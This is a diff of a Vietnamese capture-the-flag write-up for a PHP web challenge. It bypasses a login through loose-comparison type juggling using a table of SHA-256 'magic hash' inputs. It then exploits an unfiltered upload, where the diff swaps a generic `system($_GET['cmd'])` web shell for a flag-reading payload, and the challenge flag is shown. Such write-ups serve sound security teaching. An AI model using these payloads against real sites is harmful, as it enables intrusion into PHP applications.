@@ -1,4 +1,8 @@
-Quan sát source code và chức năng đăng nhập
+Inspect ta thấy source ở đây
+
+![image](https://github.com/lucthienphong1120/CookieArena-CTF/assets/90561566/725cebb1-a2d2-4a43-aacd-57a1bdfdeb7d)
+
+Dễ dàng nhận định ngay rằng không thể tận dụng SQLi được rồi.
 
 ```php
 if(isset($_POST['submit'])){ 
@@ -19,23 +23,18 @@ if(isset($_POST['submit'])){
 }
 ```
 
-Chú ý sẽ thấy có 1 phần như sau
+> Đến đây có một kiến thức nữa ta cần biết, đó là 0e, đối với PHP, có nghĩa là 0 mũ, ví dụ như 0e3 chính là cách viết của 0 mũ 3.
 
-```php
-if($pas == "0")
-```
+Ta cũng nhận thấy rằng bước check password sử dụng dấu `==`, dấu hiệu của **Loose Comparision**.
 
 Đây là lỗi **php juggling** khi php cố gắng ép kiểu dữ liệu.
 
-Nếu như **$pas** sau khi được sha256 có dạng `0exxxxxxx....` thì ký tự đầu tiên của **$pas** sẽ được đem so sánh với `"0"` là bằng nhau
-
-Tôi đã tìm được đầu vào thỏa mãn:
 | Hash | Number/String | Magic Hash |
 | --- | --- | --- |
 | SHA-256 | 34250003024812 | 0e46289032038065916139621039085883773413820991920706299695051332 |
 | SHA-256 | TyNOQHUS | 0e66298694359207596086558843543959518835691168370379069085300385 |
 
-Sau khi vào được trang /upload.php
+Sau khi qua được vòng 1, tiếp tục đến trang /upload.php
 
 ```php
 if(isset($_FILES['fileData'])){
@@ -57,9 +56,9 @@ if(isset($_FILES['fileData'])){
 Nhận thấy file upload lên không được filter extension, upload file php với payload sau:
 
 ```php
-<?php system($_GET['cmd'])>;?>
+<?php system("cat /flag.txt");?>
 ```
 
-![image](https://github.com/lucthienphong1120/CookieArena-CTF/assets/90561566/fed2b00d-10d2-4c38-a6e0-587c71f76f3b)
+![image](https://github.com/lucthienphong1120/CookieArena-CTF/assets/90561566/54dbce71-58ec-4af1-8962-0712c29cf2dd)
 
 ```CHH{PHP_m4g1c_tr1ck_0lD_but_g0lD_fdc8987c7c633ce8f9f5f2ae4599a9c8}```
